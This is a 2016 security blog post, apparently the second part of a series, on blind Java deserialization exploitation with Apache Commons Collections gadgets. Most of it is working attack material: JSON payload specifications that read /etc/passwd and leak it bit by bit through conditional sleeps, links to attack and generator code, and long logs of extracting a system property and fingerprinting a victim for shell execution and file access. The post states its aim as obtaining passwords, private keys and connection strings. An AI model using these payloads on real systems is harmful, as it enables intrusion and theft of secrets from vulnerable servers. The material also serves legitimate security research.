---
layout: post
title:  "Blind Java Deserialization - Part II - exploitation"
date:   2016-09-18 08:00:00 +0200
categories: blog
tags: hacking java deserialization commons blind exploitation
excerpt_separator: <!-- more -->

---

TL;DR: The practical exploitation of the blind java deserialization technique introduced in the previous blog post.
Practical demonstration of the victim fingerprinting and string extraction (properties, files).

<!-- more -->

**Parts:**

1. [Introduction](#introduction)
1. [Testing](#testingserver)
1. [Building the payloads dynamically](#building)
1. [JSON spec](#json)
1. [String extraction](#strings)
1. [Exploitation](#exploitation)
1. [Demo](#demo)

## Introduction {#introduction}

In the [Part 1] of our article we introduced a concept of blind Java Deserialization using Apache CommonsCollections
exploit classes. In short: with crafting a payload we can make a vulnerable application sleep on certain conditions, e.g.,
if the running Java is version 8, a binary search of the character. Such sleep leaks one bit of information. We automate
this approach to extract the whole strings and files from the vulnerable systems.

This approach is useful if normal RCE from [ysoserial] toolchain does not work from some reason (firewall, policy, selinux, IDS).
We can extract precious informations using this technique which help us with further attacks, e.g.,
database connection strings, passwords, private keys, machine configuration.

## Testing {#testingserver}

In order to test deserialization vulnerability payloads in real environment we made a simple REST server than accepts an input
parameter in BASE64, deserializes it and prints the result (if applicable). Our payloads are tested against this test server.

Apache Commons-collection 3.1 is included as dependency so the CommonsCollections exploit class works.
Server uses Spring Boot framework and can be started from command line (has embedded Tomcat server).
It is easy to test if generated payload works as expected (sleep / exception).

[Deserialize test server] can be found on the GitHub. You can test against it with our attack tool.

## Building the payloads dynamically {#building}

[ysoserial] is a good place to start with Java Deserialization. It has a simple CLI one can use to build a simple payloads.
In the [Part 1] we extended the possibilities of the payload generation.

Our target is mainly to automate binary search and string extraction from the vulnerable system.
For each guess we need to construct a new payload on the fly. There is a plenty of options
how to construct such payload dynamically so we decided to build the payload from the JSON specification.

## JSON spec {#json}

JSON specification determines how the resulting payload is constructed.
[Generator.java] then parses the JSON and returns the binary payload.

Here are few examples of payload construction:

Very simple payload - sleeps for a 5 seconds.

```json
{"exec":[
  {"cmd":"sleep", "val": 5000},
]}
```

The same sleep payload but using another CommonsCollections path - corresponds to `CommonsCollections5` in [ysoserial].
Moreover the payload is valid (default option) = it does not throw an exception after deserialization finishes (see [Part 1] for more info).

```json
{"exec":[
  {"cmd":"sleep", "val": 5000}],
  "valid": true, "module": 5
}
```

This payload has 2 consequent commands. `java` command is a macro we defined in the [Generator.java] which detects
whether the running Java version is 8. It does that by Classloading a class that was added in Java 8. Thus
if Java 8 is there, class load succeeds and sleep is invoked. If lower java version is there, class loading fails with
exception and sleep is not invoked

```json
{"exec":[
  {"cmd":"java", "val": 8},
  {"cmd":"sleep", "val": 5000}
]}
```

The following payload is a simple `if (predicate) then action`. `fileEx` is another macro which constructs a
predicate returning true if the given file exists. In this example the application sleeps in that case.

```json
{"exec":[
  {"cmd":"if",
     "pred":{"cmd":"fileEx", "val": "/etc/passwd"},
     "then":{"cmd":"sleep", "val": 5000}
  }
]}
```

This payload reads the `/etc/passwd` file from the file system, converts all characters to lowercase
 and tests if the result contains a string `nbusr123`. If does the app sleeps for 5 seconds.

```json
{"exec":[
  {"cmd":"if", "pred":[
  {"cmd":"fileRead", "val":"/etc/passwd"},
  {"cmd":"toLower"},
  {"cmd":"contains", "val":"nbusr123"}],
  "then":{"cmd":"sleep", "val": 5000}}
]}
```

This one demonstrated how to do a binary search on the input string - in this case the `/etc/passwd` file.
The page sleeps for 5 seconds if the 15th character of the file is in the regex range `[a-z]`.

```json
{"exec":[
  {"cmd":"if", "pred":[
  {"cmd":"fileRead", "val":"/etc/passwd"},
  {"cmd":"toLower"},
  {"cmd":"substr", "start":15, "stop":16},
  {"cmd":"matches", "val":"[a-z]"}],
  "then":{"cmd":"sleep", "val": 5000}}
]}
```

The last example demonstrates the payload wrapping inside a HashMap.
This is handy if the application expects the HashMap after deserialization. With this we avoid ClassCastException.

```json
{"exec":[
  {"cmd":"sleep", "val": 5000}],
  "wrap":{"type":"map", "key":"foo", "into":{
    "eval2": "java.util.HashMap m = new java.util.HashMap();m.put(\"hello\", \"world\");return m;"
}}}
```

To learn more on gadget construction consult the [Generator.java] sources.

## String extraction {#strings}

In order to extract the string we first check if the string is null or empty.
If it's not we proceed to the step 2 - length extraction.

We choose the simple algorithm to determine the string length: String.substr().
If the index is out of bounds (i.e., string does not contain it) the exception is thrown.

We thus make guesses like:

```java
String.substr(0, 1);  // ok
String.substr(0, 2);  // ok
String.substr(0, 4);  // ok
String.substr(0, 8);  // ok
String.substr(0, 16); // exception
```

If the exception is thrown we know the length of the string is somewhere in between 8 - 15.
The next step is to start a binary search in the interval 8 - 15 to find the exact length.

Then we extract one character after another using a binary search on the alphabet.
It's done by `String.matches()` using regular expressions.
The alphabet consists of printable ASCII characters + binary null.

Our regex alphabet:

```regex
[\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
```

Then the practical search goes like this:

```
String is null: false
String is empty: false
--Max length guess: 1
--Max length guess: 2
--Max length guess: 4
--Max length guess: 8
--Max length guess: 16
Length is between 7 and 16
--Length: 7 - 16, mid: 12
--Length: 7 - 11, mid: 9
--Length: 7 - 8, mid: 8
--[0]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0000]Length: 000 - 101, mid: 051. y: 1, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0000]Length: 000 - 051, mid: 026. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./01234]                         vs [56789:;<=>?@ABCDEFGHIJKLM]
--[0000]Length: 026 - 051, mid: 039. y: 0, range: [56789:;<=>?@A]                         vs [BCDEFGHIJKLM]
--[0000]Length: 039 - 051, mid: 045. y: 0, range: [BCDEFG]                         vs [HIJKLM]
--[0000]Length: 045 - 051, mid: 048. y: 0, range: [HIJ]                         vs [KLM]
--[0000]Length: 048 - 051, mid: 050. y: 0, range: [KL]                         vs [M]
--[0]=✂M✂
```

### Optimizations

The approach can be optimized so the algorithm waits a minimum time during the binary search.
This can be done simply by a frequency analysis. In the particular step the algorithm
asks whether the character being found is located in the range `[BCDEFG]` or `[HIJKLM]`.
For us is better to wait the minimum time, thus check the group which is less probable to occur (thus we don't sleep).

Also the previous guesses can be used to further optimize the search, e.g., with more
complex frequency analysis (digrams, trigrams), autocomplete engines or AI.

## Exploitation {#exploitation}

The exploitation example is in [Attack.java] which demonstrates:

- extraction of `os.name` property
- extraction of `PATH` environment variable
- extraction of `/etc/hosts` from the system
- simple victim fingerprinting (java version, OS, security manager access, few interesting properties)

## Demo {#demo}

1. Start the [Deserialize test server]
2. Test whether it is listening on port 8022 - in the readme of the server you find how to compile it and test it.
3. Run the [GeneratorTest.java] test class. It constructs payloads from JSON specifications and run them against the deserialize server.
4. Run the [AttackTest.java] test class. It contains the exploitation technique demonstration described above.
5. Have a fun.

### os.name

```
Going to extract property: os.name
Prepared alphabet: \x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s
Num steps in binary search 6.6582114827517955
Going to find length of the string
String is null: false
String is empty: false
--Max length guess: 1
--Max length guess: 2
--Max length guess: 4
--Max length guess: 8
--Max length guess: 16
Length is between 7 and 16
--Length: 7 - 16, mid: 12
--Length: 7 - 11, mid: 9
--Length: 7 - 8, mid: 8
--[0]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0000]Length: 000 - 101, mid: 051. y: 1, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0000]Length: 000 - 051, mid: 026. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./01234]                         vs [56789:;<=>?@ABCDEFGHIJKLM]
--[0000]Length: 026 - 051, mid: 039. y: 0, range: [56789:;<=>?@A]                         vs [BCDEFGHIJKLM]
--[0000]Length: 039 - 051, mid: 045. y: 0, range: [BCDEFG]                         vs [HIJKLM]
--[0000]Length: 045 - 051, mid: 048. y: 0, range: [HIJ]                         vs [KLM]
--[0000]Length: 048 - 051, mid: 050. y: 0, range: [KL]                         vs [M]
--[0]=✂M✂
--[1]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0001]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0001]Length: 051 - 101, mid: 076. y: 1, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0001]Length: 051 - 076, mid: 064. y: 0, range: [NOPQRSTUVWXYZ]                         vs [\[\\\]\^_`abcdef]
--[0001]Length: 064 - 076, mid: 070. y: 0, range: [\[\\\]\^_`]                         vs [abcdef]
--[0001]Length: 070 - 076, mid: 073. y: 1, range: [abc]                         vs [def]
--[0001]Length: 070 - 073, mid: 072. y: 1, range: [ab]                         vs [c]
--[0001]Length: 070 - 072, mid: 071. y: 1, range: [a]                         vs [b]
--[1]=✂a✂
--[2]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0002]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0002]Length: 051 - 101, mid: 076. y: 1, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0002]Length: 051 - 076, mid: 064. y: 0, range: [NOPQRSTUVWXYZ]                         vs [\[\\\]\^_`abcdef]
--[0002]Length: 064 - 076, mid: 070. y: 0, range: [\[\\\]\^_`]                         vs [abcdef]
--[0002]Length: 070 - 076, mid: 073. y: 1, range: [abc]                         vs [def]
--[0002]Length: 070 - 073, mid: 072. y: 0, range: [ab]                         vs [c]
--[2]=✂c✂
--[3]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0003]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0003]Length: 051 - 101, mid: 076. y: 0, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0003]Length: 076 - 101, mid: 089. y: 0, range: [ghijklmnopqrs]                         vs [tuvwxyz\{\|\}~\s]
--[0003]Length: 089 - 101, mid: 095. y: 0, range: [tuvwxy]                         vs [z\{\|\}~\s]
--[0003]Length: 095 - 101, mid: 098. y: 0, range: [z\{\|]                         vs [\}~\s]
--[0003]Length: 098 - 101, mid: 100. y: 0, range: [\}~]                         vs [\s]
--[3]=✂ ✂
--[4]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0004]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0004]Length: 051 - 101, mid: 076. y: 1, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0004]Length: 051 - 076, mid: 064. y: 1, range: [NOPQRSTUVWXYZ]                         vs [\[\\\]\^_`abcdef]
--[0004]Length: 051 - 064, mid: 058. y: 1, range: [NOPQRST]                         vs [UVWXYZ]
--[0004]Length: 051 - 058, mid: 055. y: 1, range: [NOPQ]                         vs [RST]
--[0004]Length: 051 - 055, mid: 053. y: 1, range: [NO]                         vs [PQ]
--[0004]Length: 051 - 053, mid: 052. y: 0, range: [N]                         vs [O]
--[4]=✂O✂
--[5]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0005]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0005]Length: 051 - 101, mid: 076. y: 1, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0005]Length: 051 - 076, mid: 064. y: 1, range: [NOPQRSTUVWXYZ]                         vs [\[\\\]\^_`abcdef]
--[0005]Length: 051 - 064, mid: 058. y: 1, range: [NOPQRST]                         vs [UVWXYZ]
--[0005]Length: 051 - 058, mid: 055. y: 0, range: [NOPQ]                         vs [RST]
--[0005]Length: 055 - 058, mid: 057. y: 1, range: [RS]                         vs [T]
--[0005]Length: 055 - 057, mid: 056. y: 0, range: [R]                         vs [S]
--[5]=✂S✂
--[6]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0006]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0006]Length: 051 - 101, mid: 076. y: 0, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0006]Length: 076 - 101, mid: 089. y: 0, range: [ghijklmnopqrs]                         vs [tuvwxyz\{\|\}~\s]
--[0006]Length: 089 - 101, mid: 095. y: 0, range: [tuvwxy]                         vs [z\{\|\}~\s]
--[0006]Length: 095 - 101, mid: 098. y: 0, range: [z\{\|]                         vs [\}~\s]
--[0006]Length: 098 - 101, mid: 100. y: 0, range: [\}~]                         vs [\s]
--[6]=✂ ✂
--[7]Range to test: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0007]Length: 000 - 101, mid: 051. y: 0, range: [\x00\x09\x0a\x0b\x0c\x0d!\"#$%&'\(\)*+,\-\./0123456789:;<=>?@ABCDEFGHIJKLM]                         vs [NOPQRSTUVWXYZ\[\\\]\^_`abcdefghijklmnopqrstuvwxyz\{\|\}~\s]
--[0007]Length: 051 - 101, mid: 076. y: 1, range: [NOPQRSTUVWXYZ\[\\\]\^_`abcdef]                         vs [ghijklmnopqrstuvwxyz\{\|\}~\s]
--[0007]Length: 051 - 076, mid: 064. y: 1, range: [NOPQRSTUVWXYZ]                         vs [\[\\\]\^_`abcdef]
--[0007]Length: 051 - 064, mid: 058. y: 0, range: [NOPQRST]                         vs [UVWXYZ]
--[0007]Length: 058 - 064, mid: 061. y: 0, range: [UVW]                         vs [XYZ]
--[0007]Length: 061 - 064, mid: 063. y: 1, range: [XY]                         vs [Z]
--[0007]Length: 061 - 063, mid: 062. y: 1, range: [X]                         vs [Y]
--[7]=✂X✂
Extracted string: Mac OS X
```

### Report - shortened

```
Sleep worked: true
Java 4 version: true
Java 5 version: true
Java 6 version: true
Java 7 version: true
Java 8 version: true
Security manager == null? true
OS: win: false
OS: mac: true
OS: darwin: false
OS: nux: false
OS: sun: false
OS: bsd: false
OS: /bin/ping false
OS: /sbin/ping true
OS: /usr/bin/ping false
OS: /usr/sbin/ping false
OS: /usr/local/bin/ping false
Can connect to google.com:80: true
Can exec /bin/bash: true
Can read /etc/passwd: true
Can write to /tmp : true
Can write to /var/tmp : true
```

[Part 1]: https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html
[ysoserial]: https://github.com/frohoff/ysoserial
[Deserialize test server]: https://github.com/yolosec/deserialize-server
[Generator.java]: https://github.com/yolosec/ysoserial/blob/master/src/main/java/ysoserial/blind/Generator.java
[Attack.java]: https://github.com/yolosec/ysoserial/blob/master/src/main/java/ysoserial/blind/Attack.java
[GeneratorTest.java]: https://github.com/yolosec/ysoserial/blob/master/src/test/java/ysoserial/blind/GeneratorTest.java
[AttackTest.java]: https://github.com/yolosec/ysoserial/blob/master/src/test/java/ysoserial/blind/AttackTest.java


